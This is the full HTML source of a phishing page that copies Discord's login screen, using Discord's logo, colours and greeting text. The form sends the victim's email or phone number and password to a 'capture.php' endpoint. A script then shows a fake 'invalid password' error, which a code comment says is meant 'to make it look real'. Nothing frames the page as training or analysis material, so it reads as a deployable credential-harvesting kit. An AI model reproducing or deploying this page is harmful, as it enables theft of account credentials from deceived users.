<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1f22;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .authBox {
            background: #2b2d31;
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }
        .discordLogo {
            background: url('https://discord.com/assets/131c318dd45b7aa4.svg') no-repeat center;
            height: 40px;
            margin-bottom: 32px;
            background-size: contain;
        }
        h1 { color: #fff; font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #b5bac1; margin-bottom: 24px; }
        .inputGroup { margin-bottom: 20px; }
        label { color: #b5bac1; font-size: 12px; font-weight: 600; display: block; margin-bottom: 8px; }
        input {
            width: 100%;
            padding: 12px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        input:focus { outline: none; border-color: #5865f2; }
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover { background: #4752c4; }
        .error { color: #fa777c; font-size: 12px; margin-top: 8px; text-align: center; display: none; }
        .qrLink { text-align: center; margin-top: 24px; }
        .qrLink a { color: #00a8fc; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="authBox">
        <div class="discordLogo"></div>
        <h1>Welcome back!</h1>
        <div class="subtitle">We're so excited to see you again!</div>
        
        <form method="POST" action="capture.php" id="loginForm">
            <div class="inputGroup">
                <label>Email or Phone Number</label>
                <input type="text" name="email" required autocomplete="off">
            </div>
            <div class="inputGroup">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Log In</button>
            <div class="error" id="errorMsg">Invalid email or password. Please try again.</div>
        </form>
        
        <div class="qrLink">
            <a href="#">Or, sign in with QR Code</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Show "incorrect password" message to make it look real
            setTimeout(function() {
                document.getElementById('errorMsg').style.display = 'block';
                // Don't clear the fields - they already submitted
            }, 100);
            // Form submits normally to capture.php
        });
    </script>
</body>
</html>
